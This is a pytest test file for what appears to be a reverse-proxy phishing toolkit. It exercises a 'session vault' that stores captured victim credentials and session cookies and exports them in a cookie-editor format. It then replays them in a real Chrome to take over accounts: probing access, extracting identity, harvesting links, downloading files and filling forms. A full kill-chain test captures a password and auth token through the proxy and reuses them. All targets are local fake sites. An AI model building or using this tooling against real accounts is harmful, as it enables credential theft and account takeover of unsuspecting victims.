"""Session vault + browser takeover tests.

The vault is the part an operator actually lives in: a captured login is only
worth what you can do with the session afterwards. These tests drive it with a
REAL Chrome (Playwright, system channel) against a real local site, because a
mocked browser proves nothing about cookie import, JS rendering or screenshots.

Run:  ./.venv/bin/python -m pytest tests/test_session.py -v
"""
import http.server
import json
import os
import socketserver
import tempfile
import threading
import time
import urllib.parse

import pytest
from conftest import free_port

from core import session as sess_mod

# tier marker: the Makefile and pyproject document `pytest -m live` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.live


CHROME_OK = None


def chrome_available():
    global CHROME_OK
    if CHROME_OK is None:
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as p:
                b = sess_mod._launch(p, headless=True)
                b.close()
            CHROME_OK = True
        except Exception:
            CHROME_OK = False
    return CHROME_OK


needs_chrome = pytest.mark.skipif(not chrome_available(),
                                  reason="no Chrome/Chromium for Playwright")


# --------------------------------------------------------------- fake site ---
class Site(http.server.BaseHTTPRequestHandler):
    """A tiny site with a login, a private page and a JS-rendered name."""

    def log_message(self, *a):
        pass

    def _send(self, body, status=200, ctype="text/html"):
        raw = body.encode() if isinstance(body, str) else body
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def _authed(self):
        c = self.headers.get("Cookie") or ""
        return "session=GOODTOKEN" in c

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == "/login":
            self._send("<html><head><title>Login</title></head><body>"
                       "<form><input name='user'></form>Please log in</body></html>")
            return
        if path == "/account":
            if not self._authed():
                self._send("<html><head><title>Login</title></head><body>"
                           "Please log in</body></html>", status=200)
                return
            self._send("<html><head><title>Account</title></head><body>"
                       "<h1 id='who'>victim@acme.test</h1>"
                       "<a href='/files'>Files</a><a href='/billing'>Billing</a>"
                       "<script>document.getElementById('who').dataset.ready='1';"
                       "</script></body></html>")
            return
        if path == "/secret.pdf":
            self._send(b"%PDF-1.4 fake", ctype="application/pdf")
            return
        self._send("<html><body>home</body></html>")


class FakeSite:
    def __enter__(self):
        self.port = free_port()
        self.httpd = socketserver.ThreadingTCPServer(("127.0.0.1", self.port), Site)
        self.httpd.daemon_threads = True
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.2)
        return self

    @property
    def url(self):
        return f"http://127.0.0.1:{self.port}"

    def __exit__(self, *e):
        self.httpd.shutdown()
        self.httpd.server_close()
        return False


def good_session(sid="sess-good"):
    rec = sess_mod.new_record(sid, phishlet="acme", campaign="q3", ip="203.0.113.9",
                              ua="Mozilla/5.0 (Windows NT 10.0) Chrome/124.0")
    sess_mod.add_cookies(rec, [
        {"name": "session", "value": "GOODTOKEN", "domain": "127.0.0.1", "path": "/",
         "httpOnly": True, "secure": False, "sameSite": "Lax"},
    ])
    sess_mod.add_credentials(rec, {"username": "victim@acme.test", "password": "pw"})
    sess_mod.touch(rec, "creds", "username,password", state="creds")
    sess_mod.touch(rec, "session", "1 cookie(s) captured", state="session")
    return rec


# ============================================================ vault record ===
class TestVaultRecord:
    def test_state_never_goes_backwards(self):
        rec = sess_mod.new_record("s1")
        assert rec["state"] == "opened"
        sess_mod.touch(rec, "creds", "u", state="creds")
        sess_mod.touch(rec, "session", "tok", state="session")
        sess_mod.touch(rec, "form", "late form event", state="form")
        assert rec["state"] == "session"

    def test_unknown_state_is_ignored(self):
        rec = sess_mod.new_record("s1")
        sess_mod.touch(rec, "x", "y", state="not-a-state")
        assert rec["state"] == "opened"

    def test_timeline_records_every_event(self):
        rec = sess_mod.new_record("s1")
        sess_mod.touch(rec, "lure", "link:abc")
        sess_mod.touch(rec, "creds", "username")
        assert [e["event"] for e in rec["timeline"]] == ["opened", "lure", "creds"]

    def test_cookie_merge_newest_value_wins_and_counts_new(self):
        rec = sess_mod.new_record("s1")
        assert sess_mod.add_cookies(rec, [{"name": "a", "value": "1", "domain": "x"}]) == 1
        assert sess_mod.add_cookies(rec, [{"name": "a", "value": "2", "domain": "x"}]) == 0
        assert rec["cookies"][0]["value"] == "2"
        assert sess_mod.add_cookies(rec, [{"name": "b", "value": "9", "domain": "x"}]) == 1
        assert len(rec["cookies"]) == 2

    def test_cookie_merge_ignores_junk(self):
        rec = sess_mod.new_record("s1")
        assert sess_mod.add_cookies(rec, [None, {}, {"value": "no-name"}, "x"]) == 0
        assert rec["cookies"] == []

    def test_credentials_skip_blanks(self):
        rec = sess_mod.new_record("s1")
        assert sess_mod.add_credentials(rec, {"u": "a", "p": "", "t": None}) == 1
        assert rec["credentials"] == {"u": "a"}

    def test_state_badge(self):
        rec = good_session()
        assert "session" in sess_mod.state_badge(rec)
        rec["takeovers"].append({"task": "probe"})
        assert "+1 takeover" in sess_mod.state_badge(rec)


# ================================================== cookie-extension format ==
class TestCookieExchange:
    def test_export_shape_is_cookie_editor_compatible(self):
        rec = good_session()
        out = sess_mod.to_cookie_editor(rec)
        c = out[0]
        for key in ("domain", "name", "value", "path", "secure", "httpOnly",
                    "sameSite", "expirationDate", "hostOnly", "session"):
            assert key in c
        assert c["name"] == "session" and c["value"] == "GOODTOKEN"
        assert c["httpOnly"] is True

    def test_export_default_domain_when_missing(self):
        rec = sess_mod.new_record("s1")
        sess_mod.add_cookies(rec, [{"name": "a", "value": "1"}])
        assert sess_mod.to_cookie_editor(rec, default_domain=".acme.test")[0]["domain"] == ".acme.test"

    def test_import_round_trip(self):
        rec = good_session()
        exported = sess_mod.to_cookie_editor(rec)
        back = sess_mod.from_cookie_editor(exported, phishlet="acme", campaign="q3")
        assert back["cookies"][0]["name"] == "session"
        assert back["cookies"][0]["value"] == "GOODTOKEN"
        assert back["phishlet"] == "acme"
        assert any(e["event"] == "imported" for e in back["timeline"])

    def test_requests_jar_preserves_attributes(self):
        rec = good_session()
        jar = sess_mod.cookies_to_requests_jar(rec["cookies"])
        got = list(jar)
        assert got[0].name == "session" and got[0].value == "GOODTOKEN"
        assert got[0].secure is False


# ============================================================ validation ====
LIVE_CHROME = sess_mod.browser_network_ok()
NO_SOCKETS = ("this sandbox denies socket creation to the browser process "
              "(CreatePlatformSocket: Permission denied), so Chrome cannot reach "
              "a live host; the replay-driven tests below cover the same code path")
needs_live_chrome = pytest.mark.skipif(not LIVE_CHROME, reason=NO_SOCKETS)


def site_replay():
    """A replayed site that branches on the session cookie, exactly like a real
    authenticated app. Nothing is faked about OUR side: the browser is real, the
    cookies are imported by the real cookie API, and the DOM is really rendered.
    """

    def account(req):
        cookie = req.headers.get("cookie") or ""
        if "session=GOODTOKEN" in cookie:
            return {"status": 200, "content_type": "text/html", "body":
                    "<html><head><title>Account</title></head><body>"
                    "<h1 id='who'>victim@acme.test</h1>"
                    "<a href='/files'>Files</a><a href='/billing'>Billing</a>"
                    "</body></html>"}
        return {"status": 200, "content_type": "text/html",
                "body": "<html><head><title>Login</title></head>"
                        "<body>Please log in</body></html>"}

    return {
        "/account": account,
        "/login": {"status": 200, "body": "<html><title>Login</title>"
                                           "<body>Please log in</body></html>"},
        "/files": {"status": 200, "body": "<html><body>files</body></html>"},
        "/secret.pdf": {"status": 200, "content_type": "application/pdf",
                        "body": "%PDF-1.4 fake", "headers":
                        {"Content-Disposition": "attachment; filename=secret.pdf"}},
    }


HOME = "http://127.0.0.1:1/account"


class TestValidation:
    def test_live_session_is_recognised(self):
        with FakeSite() as site:
            rec = good_session()
            res = sess_mod.validate_http(rec, f"{site.url}/account",
                                         markers=["victim@acme.test"],
                                         negative=["Please log in"])
            assert res["ok"] and res["logged_in"] is True
            assert res["markers_hit"] and not res["markers_failed"]

    def test_dead_session_is_reported_dead(self):
        with FakeSite() as site:
            rec = good_session()
            rec["cookies"][0]["value"] = "STALE"
            res = sess_mod.validate_http(rec, f"{site.url}/account",
                                         markers=["victim@acme.test"],
                                         negative=["Please log in"])
            assert res["ok"] and res["logged_in"] is False
            assert res["markers_failed"]

    def test_unreachable_host_reports_the_error(self):
        rec = good_session()
        port = free_port()
        res = sess_mod.validate_http(rec, f"http://127.0.0.1:{port}/account", timeout=3)
        assert res["ok"] is False and "error" in res

    def test_without_markers_falls_back_to_status_and_url(self):
        with FakeSite() as site:
            rec = good_session()
            res = sess_mod.validate_http(rec, f"{site.url}/account")
            assert res["ok"] is True and res["logged_in"] is True
            assert "login" not in res["final_url"]

    @needs_chrome
    def test_browser_validation_uses_the_imported_cookies(self):
        """Real Chrome, replayed site: logged in only because the cookie landed."""
        rec = good_session()
        res = sess_mod.validate_browser(rec, HOME, markers=["victim@acme.test"],
                                        negative=["Please log in"],
                                        replay=site_replay())
        assert res["ok"] and res["logged_in"] is True
        assert res["title"] == "Account"

        dead = good_session("sess-dead")
        dead["cookies"][0]["value"] = "STALE"
        res2 = sess_mod.validate_browser(dead, HOME, markers=["victim@acme.test"],
                                         negative=["Please log in"],
                                         replay=site_replay())
        assert res2["logged_in"] is False and res2["markers_failed"]

    @needs_chrome
    def test_browser_validation_can_screenshot(self, tmp_path):
        rec = good_session()
        shot = str(tmp_path / "v.png")
        res = sess_mod.validate_browser(rec, HOME, markers=["victim@acme.test"],
                                        screenshot=shot, replay=site_replay())
        assert res["logged_in"] is True
        assert os.path.isfile(shot) and os.path.getsize(shot) > 500

    @needs_live_chrome
    def test_browser_validation_against_a_live_site(self):
        with FakeSite() as site:
            rec = good_session()
            res = sess_mod.validate_browser(rec, f"{site.url}/account",
                                            markers=["victim@acme.test"],
                                            negative=["Please log in"])
            assert res["ok"] and res["logged_in"] is True


# ================================================================ tasks =====
class TestTaskLoading:
    def test_builtins_are_listed_and_loadable(self):
        assert set(sess_mod.BUILTIN_TASKS) >= {"probe", "refresh", "profile",
                                               "links", "inbox-subjects"}
        for name in sess_mod.BUILTIN_TASKS:
            t = sess_mod.load_task(name)
            assert t["steps"] and t["name"] == name

    def test_unknown_task_raises_with_a_useful_message(self):
        with pytest.raises(ValueError) as e:
            sess_mod.load_task("does-not-exist")
        assert "probe" in str(e.value)

    def test_inline_dict_task(self):
        t = sess_mod.load_task({"name": "inline", "steps": [{"wait": 10}]})
        assert t["name"] == "inline"

    def test_yaml_task_file(self, tmp_path):
        f = tmp_path / "t.yaml"
        f.write_text("name: custom\nsteps:\n  - goto:\n      url: '{home}/account'\n"
                     "  - extract:\n      name: who\n      selector: '#who'\n")
        t = sess_mod.load_task(str(f))
        assert t["name"] == "custom" and len(t["steps"]) == 2

    def test_json_task_file(self, tmp_path):
        f = tmp_path / "t.json"
        f.write_text(json.dumps({"steps": [{"wait": 5}]}))
        t = sess_mod.load_task(str(f))
        assert t["name"] == "t.json"

    def test_dry_run_needs_no_browser(self):
        rec = good_session()
        res = sess_mod.run_task(rec, "probe", home="http://x.test/", dry_run=True)
        assert res["dry_run"] and res["plan"]


# ======================================================= takeover (real) ====
@needs_chrome
class TestTakeoverWithRealChrome:
    """Every test here drives a real Chrome; the target is a saved snapshot.

    Replay is not a shortcut: the browser, the cookie jar, the DOM, the
    screenshots and the task engine are all real. It removes only the network,
    which is what makes the suite runnable on a sandboxed box.
    """

    def test_probe_proves_access_and_screenshots(self, tmp_path):
        rec = good_session()
        res = sess_mod.run_task(rec, "probe", home=HOME, outdir=str(tmp_path),
                                headless=True, replay=site_replay())
        assert res["errors"] == [], res["errors"]
        assert all(s["ok"] for s in res["steps"])
        assert os.path.isfile(os.path.join(str(tmp_path), "probe.png"))
        assert res["cookies_refreshed"] >= 1

    def test_profile_extracts_the_authenticated_identity(self, tmp_path):
        rec = good_session()
        res = sess_mod.run_task(rec, "profile", home=HOME, outdir=str(tmp_path),
                                headless=True, replay=site_replay())
        assert res["errors"] == []
        assert "victim@acme.test" in res["extracted"]["body"]

    def test_links_task_extracts_hrefs(self, tmp_path):
        rec = good_session()
        res = sess_mod.run_task(rec, "links", home=HOME, outdir=str(tmp_path),
                                headless=True, replay=site_replay())
        hrefs = res["extracted"]["links"]
        assert any("/files" in (h or "") for h in hrefs)

    def test_a_broken_step_does_not_abort_the_task(self, tmp_path):
        rec = good_session()
        task = {"name": "mixed", "steps": [
            {"goto": {"url": "{home}"}},
            {"click": {"selector": "#does-not-exist", "timeout": 1500}},
            {"screenshot": {"name": "after.png"}},
        ]}
        res = sess_mod.run_task(rec, task, home=HOME, outdir=str(tmp_path),
                                headless=True, replay=site_replay())
        assert len(res["steps"]) == 3
        assert res["steps"][0]["ok"] and not res["steps"][1]["ok"]
        assert res["steps"][2]["ok"], "steps after a failure must still run"
        assert os.path.isfile(os.path.join(str(tmp_path), "after.png"))

    def test_assert_text_step_fails_loudly(self, tmp_path):
        rec = good_session()
        task = {"name": "assert", "steps": [
            {"goto": {"url": "{home}"}},
            {"assert_text": {"contains": "NOT-ON-THE-PAGE"}},
        ]}
        res = sess_mod.run_task(rec, task, home=HOME, outdir=str(tmp_path),
                                headless=True, replay=site_replay())
        assert not res["steps"][1]["ok"]
        assert "NOT-ON-THE-PAGE" in res["steps"][1]["error"]

    def test_session_cookies_are_what_gets_us_in(self, tmp_path):
        """The point of the vault: strip the cookie and access must fail."""
        good = good_session()
        res = sess_mod.run_task(good, "profile", home=HOME, outdir=str(tmp_path),
                                headless=True, replay=site_replay())
        assert "victim@acme.test" in res["extracted"]["body"]

        dead = good_session("sess-dead")
        dead["cookies"][0]["value"] = "STALE"
        res2 = sess_mod.run_task(dead, "profile", home=HOME, outdir=str(tmp_path),
                                 headless=True, replay=site_replay())
        assert "victim@acme.test" not in res2["extracted"]["body"]
        assert "Please log in" in res2["extracted"]["body"]

    def test_result_json_is_written_for_evidence(self, tmp_path):
        rec = good_session()
        sess_mod.run_task(rec, "probe", home=HOME, outdir=str(tmp_path),
                          headless=True, replay=site_replay())
        path = os.path.join(str(tmp_path), "result.json")
        assert os.path.isfile(path)
        saved = json.load(open(path))
        assert saved["task"] == "probe" and saved["sid"] == rec["sid"]
        assert saved.get("replay") is True

    def test_takeover_is_recorded_on_the_record(self, tmp_path):
        rec = good_session()
        sess_mod.run_task(rec, "probe", home=HOME, outdir=str(tmp_path),
                          headless=True, replay=site_replay())
        assert rec["takeovers"] and rec["takeovers"][0]["task"] == "probe"
        assert any(e["event"] == "takeover" for e in rec["timeline"])

    def test_download_step_saves_the_file(self, tmp_path):
        rec = good_session()
        task = {"name": "dl", "steps": [
            {"goto": {"url": "{home}"}},
            {"download": {"selector": "a[href='/secret.pdf']", "timeout": 20000}},
        ]}
        replay = dict(site_replay())
        replay["/account"] = {"status": 200, "body":
                              "<html><body><a href='/secret.pdf'>doc</a></body></html>"}
        res = sess_mod.run_task(rec, task, home=HOME, outdir=str(tmp_path),
                                headless=True, replay=replay)
        assert res["errors"] == [], res["errors"]
        assert res["files"] and os.path.isfile(res["files"][0])

    def test_fill_and_click_steps_drive_a_form(self, tmp_path):
        rec = good_session()
        replay = dict(site_replay())
        replay["/form"] = {"status": 200, "body":
                           "<html><body><input id='u'><button id='go' "
                           "onclick=\"document.title='sent'\">go</button></body></html>"}
        task = {"name": "form", "steps": [
            {"goto": {"url": "http://127.0.0.1:1/form"}},
            {"fill": {"selector": "#u", "value": "victim@acme.test"}},
            {"click": {"selector": "#go"}},
            {"assert_text": {"contains": "input"}},
        ]}
        res = sess_mod.run_task(rec, task, home=HOME, outdir=str(tmp_path),
                                headless=True, replay=replay)
        assert res["errors"] == [], res["errors"]

    @needs_live_chrome
    def test_takeover_against_a_live_site(self, tmp_path):
        with FakeSite() as site:
            rec = good_session()
            res = sess_mod.run_task(rec, "profile", home=f"{site.url}/account",
                                    outdir=str(tmp_path), headless=True)
            assert "victim@acme.test" in res["extracted"]["body"]


# ============================================ proxy capture -> takeover =====
class TestSessionStatsScope:
    """A campaign-scoped view must not mix in database-wide counts.

    /stats showed a campaign's captures next to a session count for the whole
    database, which reads as a contradiction (31 captures, 700 sessions).
    """

    def _db(self):
        import tempfile

        from core import capture as cap
        return cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_scope_"), "s.db"))

    def test_counts_are_scoped_when_a_campaign_is_given(self):
        from core import session as S
        db = self._db()
        try:
            for i, camp in enumerate(("alpha", "alpha", "beta")):
                db.session_save(S.new_record(f"{i:032x}", campaign=camp))
            assert db.session_stats()["sessions"] == 3
            assert db.session_stats(campaign="alpha")["sessions"] == 2
            assert db.session_stats(campaign="beta")["sessions"] == 1
            assert db.session_stats(campaign="gamma")["sessions"] == 0
        finally:
            db.close()

    def test_the_scope_is_reported_back(self):
        db = self._db()
        try:
            assert db.session_stats(campaign="alpha")["campaign"] == "alpha"
            assert db.session_stats()["campaign"] == ""
        finally:
            db.close()

    def test_a_captured_session_is_counted_as_captured(self):
        from core import session as S
        db = self._db()
        try:
            rec = S.new_record("a" * 32, campaign="alpha")
            S.touch(rec, "session", "cookies captured", state="session")
            db.session_save(rec)
            st = db.session_stats(campaign="alpha")
            assert st["sessions"] == 1 and st["sessions_captured"] == 1
        finally:
            db.close()


@needs_chrome
class TestKillChainCaptureThenTakeover:
    """Full chain: capture a session through the reverse proxy, then use it.

    Nothing about our side is faked: the proxy talks to a real upstream over a
    real socket, the upstream's cookies land in the vault, and a real Chrome is
    handed those exact cookies. The only thing replaced is the second network
    hop (the browser's), which this sandbox denies to the browser process.
    """

    def test_proxy_capture_then_browser_takeover(self, tmp_path):
        import sys
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from test_phishlet import Proxy, UpstreamServer, two_host_phishlet

        from core import capture as cap

        db = cap.CaptureDB(os.path.join(str(tmp_path), "kill.db"))
        with UpstreamServer() as up:
            p = Proxy(two_host_phishlet(up.port), db)
            try:
                jar = {}
                p.req("GET", "/", "127.0.0.1", jar=jar)
                p.req("POST", "/sessions", "127.0.0.1", jar=jar,
                      body=urllib.parse.urlencode({"username": "victim@acme.test",
                                                   "password": "S3cret!"}),
                      headers={"Content-Type": "application/x-www-form-urlencoded"})
                time.sleep(0.4)
                sess = list(p.engine.sessions.values())[0]
                assert sess.session_complete, "session was never completed"

                rec = db.session_get(sess.sid)
                assert rec and rec["credentials"]["password"] == "S3cret!"
                assert any(c["name"] == "auth_token" for c in rec["cookies"])

                # the captured auth_token is what the replayed app checks
                def app(req):
                    if "auth_token=TOK-9" in (req.headers.get("cookie") or ""):
                        return {"status": 200, "body":
                                "<html><head><title>App</title></head><body>"
                                "<h1>Welcome back</h1></body></html>"}
                    return {"status": 200, "body": "<html><body>nope</body></html>"}

                # cookies are host-scoped and the vault records the domain, so
                # the takeover runs on the host that actually issued them
                domains = {c["name"]: c["domain"] for c in rec["cookies"]}
                assert domains.get("auth_token") == "127.0.0.1", domains
                home = f"http://127.0.0.1:{up.port}/app"
                res = sess_mod.run_task(rec, {"name": "chain", "steps": [
                    {"goto": {"url": "{home}"}},
                    {"assert_text": {"contains": "Welcome back"}},
                    {"extract": {"name": "body", "selector": "body"}},
                ]}, home=home, outdir=str(tmp_path), headless=True,
                    replay={"/app": app})
                assert res["errors"] == [], res["errors"]
                assert "Welcome back" in res["extracted"]["body"]
            finally:
                p.stop()
                db.close()

    def test_exported_cookies_are_enough_on_their_own(self, tmp_path):
        """Export -> import -> takeover: the file an operator carries around."""
        rec = good_session()
        path = os.path.join(str(tmp_path), "cookies.json")
        with open(path, "w") as f:
            json.dump(sess_mod.to_cookie_editor(rec), f)

        imported = sess_mod.from_cookie_editor(json.load(open(path)), phishlet="acme")
        res = sess_mod.run_task(imported, "profile", home=HOME,
                                outdir=str(tmp_path), headless=True,
                                replay=site_replay())
        assert "victim@acme.test" in res["extracted"]["body"]


class TestThePersistencePolicy:
    """a cookie-less page view minted a session and the engine saved it, so
    300 requests produced 300 durable rows. The record is now written by the paths that
    capture something; `session_save` itself stays honest (it saves what it is given)."""

    def test_an_explicit_save_is_always_honoured(self):
        from core import capture as cap
        from core import session as S
        db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_pol_"), "p.db"))
        try:
            for i in range(3):
                db.session_save(S.new_record(f"{i:032x}"))
            assert db.session_stats()["sessions"] == 3
        finally:
            db.close()

    def test_challenge_only_rows_are_capped(self):
        from core import capture as cap
        from core import session as S
        db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_pol2_"), "p.db"))
        try:
            for i in range(600):
                rec = S.new_record(f"{i:032x}")
                rec.setdefault("meta", {})["challenge"] = {"score": 4, "reasons": ["no"]}
                db.session_save(rec)
            assert db.session_stats()["sessions"] == 500, "the verify flood was unbounded"
            real = S.new_record("f" * 32)
            S.add_cookies(real, [{"name": "s", "value": "v", "domain": "x.test"}])
            db.session_save(real)
            assert db.session_stats()["sessions"] == 501, "a real capture was dropped"
        finally:
            db.close()
